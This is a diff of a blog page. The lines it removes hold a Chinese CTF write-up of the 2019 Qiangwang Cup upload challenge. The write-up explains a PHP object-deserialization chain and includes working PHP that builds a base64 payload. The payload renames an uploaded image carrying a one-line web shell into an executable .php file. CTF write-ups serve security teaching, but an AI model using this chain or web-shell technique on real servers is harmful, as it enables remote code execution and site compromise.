-<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>打开网页，是一个登录界面<br><img src="https://Ernket.github.io/post-images/1564568502326.png" alt=""><br>注册完后，登录，便是一个上传点<br><img src="https://Ernket.github.io/post-images/1564568508001.png" alt=""><br>一系列的绕过操作试了一遍后，发现都不行，只能上传包含恶意语句的图片<br>打开BP抓包后发现，参数user是一串base64编码的字符串<br><img src="https://Ernket.github.io/post-images/1564568524431.png" alt=""><br>一系列解码后得到序列化内容<br><img src="https://Ernket.github.io/post-images/1564568528077.png" alt=""><br>拎去反序列化，得到一个文件名，猜测上传文件后，将文件名重命名了一遍<br><img src="https://Ernket.github.io/post-images/1564568531219.png" alt=""><br>这个时候，利用目录爆破工具会在网站中找到一个<code>www.tar.gz</code>这个文件，因为这个docker环境没有，所以这里没图。下载下来后，审计中找到了<code>__destruct()</code>魔法函数<br><img src="https://Ernket.github.io/post-images/1564568546257.png" alt=""><br>同时，在Index.php中，找到了身份验证的方法<br><img src="https://Ernket.github.io/post-images/1564568565753.png" alt=""><br> <code>Index.php</code>会对传入的内容进行base64解码，然后反序列化<br><img src="https://Ernket.github.io/post-images/1564568573027.png" alt=""><br>继续审计，发现了<code>Profile.php</code>中，有对文件重命名的操作<br><img src="https://Ernket.github.io/post-images/1564568582452.png" alt=""><br>那么，为了能正常的利用upload_img来进行copy操作，就得将if都过了，首先是这个if</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token variable">$curr_url</span><span class="token operator">=</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//".$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']."/index";</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token variable">$curr_url</span><span class="token punctuation">,</span><span class="token number">302</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>要确保里面的内容不会被执行，<code>checker</code>不赋值或者等于false就好了</p>
-<p>到第二个if</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token operator">=</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">".png"</span><span class="token punctuation">;</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">ext_check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>两个文件名的参数都没有什么过滤，唯一的阻碍是<code>ext_check()</code>，他会判断你的后缀是否为png，没啥用</p>
-<p>第三个if</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ext</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    @<span class="token function">copy</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename_tmp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">img</span><span class="token operator">=</span><span class="token string">"../upload/$this->upload_menu/$this->filename"</span><span class="token punctuation">;</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update_img</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Forbidden type!'</span><span class="token punctuation">,</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token string">'../index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
-    <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Unknow file type!'</span><span class="token punctuation">,</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token string">'../index'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>首先是ext的值，需要为<code>True</code></p>
-<p>其次还得注意这个</p>
-<pre><code>if(getimagesize($this-&gt;filename_tmp)) {
-</code></pre><p><img src="https://Ernket.github.io/post-images/1564568646179.png" alt=""></p>
-<p>所以得是一个好的图片，里面插入一句话木马才行，然后<code>filename_tmp</code>和<code>finename</code>就是加密后的文件名和源文件名<br>三个IF都解决了，问题是怎么通过反序列化来调用<code>upload_img</code>呢</p>
-<p>在当前文件<code>Profile.php</code>中，我们发现了<code>__get</code>和<code>__call</code>这两个魔法函数<br><img src="https://Ernket.github.io/post-images/1564568683243.png" alt=""></p>
-<pre><code>读取不可访问属性的值时，__get() 会被调用；
-在对象中调用一个不可访问方法时，__call() 会被调用。
-(上面两句内容来自https://www.freebuf.com/articles/web/205690.html的解释)
-</code></pre><p>首先回到Register.php中看<code>__destruct()</code>的操作</p>
-<p><img src="https://Ernket.github.io/post-images/1564568720008.png" alt=""><br><img src="https://Ernket.github.io/post-images/1564568724500.png" alt=""><br>上面两图说明了，checker会去<code>Index()</code>中调用<code>index()</code>（注意区分大小写）</p>
-<p>如果我们将<code>$this-&gt;checker</code>覆盖为<code>类Profile()</code>但是因为<code>Profile()</code>中没有index()，所以会触发<code>__call()</code>魔法函数</p>
-<pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$arguments</span><span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
-        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token punctuation">{</span><span class="token variable">$name</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token variable">$arguments</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span>
-</code></pre>
-<p>进入该类之后，会调用一个不存在的对象，导致<code>__get()</code>的触发，所以我们需要在序列化的时候，将<code>except</code>赋值为</p>
-<pre><code>public $except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);
-</code></pre><p>就可以触发<code>upload_img</code>，达到改名的效果了</p>
-<p>下面是攻击链</p>
-<pre><code>__destruct()-&gt;__call()-&gt;__get()-&gt;upload_img
-</code></pre><p>构造PHP代码：</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token keyword">namespace</span> <span class="token package">app<span class="token punctuation">\</span>web<span class="token punctuation">\</span>controller</span><span class="token punctuation">;</span>
-<span class="token keyword">class</span> <span class="token class-name">Profile</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token operator">=</span><span class="token string">"文件名"</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">"更改后的文件名"</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$upload_menu</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$ext</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$img</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$except</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">'upload_img'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token punctuation">}</span>
-<span class="token keyword">class</span> <span class="token class-name">Register</span>
-<span class="token punctuation">{</span>
-    <span class="token keyword">public</span> <span class="token variable">$checker</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$registed</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-
-<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Profile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">checker</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token comment" spellcheck="true">// echo serialize($a);</span>
-<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter">?></span>
-</code></pre>
-<p>打开网页，我们先上传一个图片马</p>
-<p><img src="https://Ernket.github.io/post-images/1564568739467.png" alt=""></p>
-<p>获取图片路径</p>
-<p><img src="https://Ernket.github.io/post-images/1564568743212.png" alt=""></p>
-<p>然后修改php代码</p>
-<pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token variable">$filename_tmp</span><span class="token operator">=</span><span class="token string">"../public/upload/99afcd599914c2e4fb42620458fb70af/364be8860e8d72b4358b5e88099a935a.png"</span><span class="token punctuation">;</span>
-    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token string">"/public/upload/99afcd599914c2e4fb42620458fb70af/Elapse.php"</span><span class="token punctuation">;</span>
-</code></pre>
-<p>执行后将生成的base64内容，通过bp发送到服务器上</p>
-<p><img src="https://Ernket.github.io/post-images/1564568749216.png" alt=""></p>
-<p>页面报错</p>
-<p><img src="https://Ernket.github.io/post-images/1564568758857.png" alt=""></p>
-<p>这时我们回到图片的目录下，发现名字已经更改</p>
-<p><img src="https://Ernket.github.io/post-images/1564568770184.png" alt=""><br>试着执行一下命令，成功<br><img src="https://Ernket.github.io/post-images/1564568783026.png" alt=""></p>
-
+              <!--more-->
+          
       
     </div>
     
@@ -1177,6 +731,10 @@ Result(sign, file)
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/网络安全/">网络安全</a></li></ul>
     </div>
 
+      
+        <p class="article-more-link">
+          <a   href="/2019/07/31/2019强网杯Upload题Writeup/#more">查看更多 >></a>
+        </p>
       
       <div class="clearfix"></div>
     </div>
